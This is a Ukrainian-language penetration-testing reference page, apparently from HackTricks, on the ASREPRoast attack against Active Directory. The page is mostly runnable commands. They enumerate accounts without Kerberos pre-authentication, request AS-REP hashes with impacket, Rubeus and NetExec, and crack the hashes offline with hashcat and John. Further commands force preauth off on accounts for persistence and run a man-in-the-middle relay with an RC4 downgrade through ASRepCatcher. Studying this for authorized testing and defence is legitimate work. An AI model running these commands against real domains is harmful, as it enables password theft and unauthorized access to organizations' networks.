# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast — це security attack, що використовує вразливих користувачів, для яких не встановлено атрибут **Kerberos pre-authentication required**. По суті, ця вразливість дає attackers змогу запитати автентифікацію користувача в Domain Controller (DC) без пароля користувача. Після цього DC відповідає повідомленням, зашифрованим ключем, отриманим із пароля користувача, яке attackers можуть спробувати crack offline, щоб дізнатися пароль користувача.

Основні вимоги для цієї атаки:

- **Відсутність Kerberos pre-authentication**: для цільових користувачів ця функція безпеки не повинна бути увімкнена.
- **Підключення до Domain Controller (DC)**: attackers потрібен доступ до DC, щоб надсилати запити й отримувати зашифровані повідомлення.
- **Необов'язковий доменний обліковий запис**: наявність доменного облікового запису дає attackers змогу ефективніше знаходити вразливих користувачів за допомогою LDAP-запитів. Без такого облікового запису attackers повинні вгадувати імена користувачів.

#### Перерахування вразливих користувачів (потрібні доменні облікові дані)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Запит AS_REP message
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus за замовчуванням запитує **RC4**, тому Event ID **4768** зазвичай показує **preauth type 0** і **ticket encryption type 0x17**. Якщо додати **`/aes`** (або RC4 вимкнено для цільового об'єкта), очікуйте **AES etypes**.<sup>[[2]](#references)</sup>

#### Короткі однорядкові команди (Linux)

- Спочатку перелічіть потенційні цілі (наприклад, зі leaked build paths) за допомогою Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Виконайте AS-REP roast для всього списку імен користувачів без валідних облікових даних за допомогою NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- Якщо у вас є облікові дані, дозвольте NetExec виконати запит до LDAP і самостійно запросити всі облікові записи, доступні для AS-REP roast: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- Якщо результат починається з **`$krb5asrep$23$`**, зламайте його за допомогою Hashcat **`-m 18200`**. Якщо він починається з **`$krb5asrep$17$`** або **`$krb5asrep$18$`**, надайте перевагу John із параметром **`--format=krb5asrep`**.<sup>[[1]](#references)[[2]](#references)</sup>

### Зламування

Не припускайте, що кожен AS-REP roast використовує RC4. Сучасні інструменти можуть повертати **RC4** (`$krb5asrep$23$`) або **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`) залежно від запитаного або узгодженого enctype. **`hashcat -m 18200`** призначений для **etype 23**, тоді як **John** безпосередньо обробляє `krb5asrep` для **17/18/23**.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### Закріплення

Примусово вимкнути **preauth** для користувача, щодо якого ви маєте права **GenericAll** (або права на запис властивостей):
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast без облікових даних

Атакувальник може використати позицію man-in-the-middle для перехоплення AS-REP пакетів під час їхнього проходження мережею, не покладаючись на вимкнену Kerberos pre-authentication. Тому це працює для всіх користувачів у VLAN.\
Якщо вам потрібен пов’язаний no-credential trick, який повертає **service ticket**, а не **TGT**, від no-preauth principal, дивіться [Kerberoast](kerberoast.md).

[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) дозволяє це зробити. Режим `relay` є найцікавішим з offensive perspective, оскільки він може примусово використовувати **RC4**, коли клієнт усе ще рекламує **etype 23**; `listen` залишається пасивним і просто перехоплює те, що узгодили клієнт і DC.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Посилання

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
